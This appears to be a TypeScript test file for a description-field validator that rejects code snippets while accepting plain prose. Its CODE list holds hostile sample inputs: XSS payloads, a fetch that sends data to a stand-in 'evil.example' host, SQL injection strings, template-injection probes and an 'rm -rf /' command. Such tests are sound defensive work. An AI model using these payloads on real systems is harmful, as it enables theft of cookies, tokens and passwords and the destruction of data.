import { describe, expect, it } from 'vitest';

import { CODE_SNIPPET_PATTERNS, CODE_SNIPPET_SOURCES } from '../rules';
import { validateBySpec } from '../useFormValidation';
import { containsCodeSnippet, validateDescription } from '../validators';

/**
 * A project's or a task's description is plain text. These are the shapes of
 * code that carry no `<tag>` at all, which the structural check alone lets
 * through — and the sentences that must keep working.
 */

const CODE = [
  '<script>alert(1)</script>',
  '<style>body{display:none}</style>',
  '<img src=x onerror=alert(1)>',
  '<!-- hidden -->',
  '< script >alert(1)</ script >',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '\\u003cscript\\u003ealert(1)',
  'javascript:alert(1)',
  "alert('xss')",
  'alert(document.cookie)',
  "eval('1+1')",
  "document.write('x')",
  "window.location = 'http://evil.example'",
  "fetch('http://evil.example/steal')",
  "localStorage.getItem('token')",
  'el.innerHTML = userInput',
  'function foo() { return 1; }',
  'const run = () => { go(); }',
  'var a = 1; var b = 2;',
  "console.log('hi')",
  'if (x > 1) { go(); }',
  'xs.map(x => x * 2)',
  "$('#btn').click(function(){ alert(1) })",
  '$(document).ready(function() { x() })',
  "jQuery('#a').hide()",
  "$.ajax({ url: '/x' })",
  'body { color: red; }',
  '.btn { display: none; }',
  '#id{background:url(x)}',
  '@import url(x);',
  '<?php echo 1; ?>',
  "import os\nos.system('rm -rf /')",
  "' OR 1=1 --",
  'x\' UNION SELECT password FROM users --',
  'SELECT * FROM users; DROP TABLE users;',
  '{{7*7}}',
  '${7*7}',
];

const PROSE = [
  'Write the Q3 report',
  "Fix login bug: user can't sign in (see #123)",
  'Call the client at 5pm & confirm the budget',
  '5 < 10 and 10 > 5',
  'Cost is $5 (approx) or $(10)',
  'Update the colour scheme: red; blue; green',
  'Task: do A, then B; finally C.',
  'Use function: sum(a, b) of values',
  'Line one\nLine two',
  '日本語のタスク説明',
  'Задача: подготовить отчёт',
  'مراجعة التقرير الشهري',
  'Fix the alert system (the alarm notification)',
  'Review the document (v2) and window layout',
  'Meeting - 10:30; room: B2',
  'Prices: item {a} and item {b}',
  'Note: eval results (Q2) pending',
  'Plan -> Build -> Ship',
  "Open document.pdf and send it to O'Brien & Sons",
  'Run 100% of the regression suite',
  'Update the on-boarding email = done',
];

const strict = { fieldLabel: 'Description', rejectCode: true } as const;

describe('validateDescription with rejectCode', () => {
  it.each(CODE)('rejects %j', (value) => {
    const result = validateDescription(value, strict);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.startsWith('Description:')).toBe(true);
      // Written for the person who typed it: no pattern leaks into the message.
      expect(result.error).not.toContain('(?');
    }
  });

  it.each(PROSE)('accepts %j unchanged', (value) => {
    const result = validateDescription(value, strict);
    expect(result).toEqual({ ok: true, value });
  });

  it('trims surrounding space and changes nothing else', () => {
    expect(validateDescription('  Cover Q3\r\nand Q4  ', strict)).toEqual({
      ok: true,
      value: 'Cover Q3\nand Q4',
    });
  });

  it('treats blank as no description', () => {
    expect(validateDescription('   ', strict)).toEqual({ ok: true, value: '' });
    expect(validateDescription(null, strict)).toEqual({ ok: true, value: '' });
  });

  it('refuses rather than repairs: a rejected value is never returned cleaned', () => {
    const result = validateDescription('Ship it <b>today</b>', strict);
    expect(result.ok).toBe(false);
  });

  it('stays off unless asked for, so a bug report may still quote a snippet', () => {
    const quoted = "The button breaks when I run $('.x').hide() in the console";
    expect(containsCodeSnippet(quoted)).toBe(true);
    expect(validateDescription(quoted).ok).toBe(true);
    expect(validateDescription(quoted, strict).ok).toBe(false);
  });

  it('keeps the length limit', () => {
    expect(validateDescription('x'.repeat(5000), strict).ok).toBe(true);
    expect(validateDescription('x'.repeat(5001), strict).ok).toBe(false);
  });
});

describe('the form-spec mapping', () => {
  it('honours rejectCode on a description field', () => {
    const spec = { rule: 'description', label: 'Description', rejectCode: true } as const;
    expect(validateBySpec("alert('x')", spec).ok).toBe(false);
    expect(validateBySpec('A plain sentence.', spec)).toEqual({ ok: true, value: 'A plain sentence.' });
  });

  it('does not apply it to a description field that did not ask', () => {
    const spec = { rule: 'description', label: 'Message' } as const;
    expect(validateBySpec("alert('x')", spec).ok).toBe(true);
  });
});

describe('the pattern catalogue', () => {
  it('compiles every source and keeps one pattern per source', () => {
    expect(CODE_SNIPPET_PATTERNS).toHaveLength(CODE_SNIPPET_SOURCES.length);
    CODE_SNIPPET_PATTERNS.forEach((pattern) => expect(pattern).toBeInstanceOf(RegExp));
  });

  it('carries no backtick, so a source reads the same in Python and TypeScript', () => {
    CODE_SNIPPET_SOURCES.forEach(([source]) => expect(source).not.toContain('`'));
  });
});
